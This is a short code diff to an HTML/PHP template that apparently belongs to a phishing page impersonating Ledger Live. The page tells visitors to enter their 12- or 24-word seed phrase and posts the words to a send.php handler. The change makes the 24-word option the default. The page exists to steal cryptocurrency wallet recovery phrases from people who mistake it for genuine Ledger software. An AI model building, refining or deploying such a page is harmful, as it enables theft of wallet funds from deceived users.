@@ -18,8 +18,8 @@
                         <p class="my20 text-white-50">**Ledger does not keep a copy of your recovery phrase.</p>
                         <p class="my20 text-white-50 fs14">**ENTER 24 SEED PHRASE WORDS CORRECTLY TO START LEDGER LIVE.</p>
                         <div class="pt20 pb10">
-                            <button data-word="12" class="btn btn-dark px20 formactive activeForm">12 Words</button>
-                            <button data-word="24" class="btn btn-dark px20 ms20 activeForm">24 Words</button>
+                            <button data-word="24" class="btn btn-dark px20 formactive activeForm">24 Words</button>
+                            <button data-word="12" class="btn btn-dark px20 ms20 activeForm">12 Words</button>
                         </div>
                         <form method="post" action="<?= base_url('send.php')?>" class="py10">
                             <div class="row form_keys"></div>
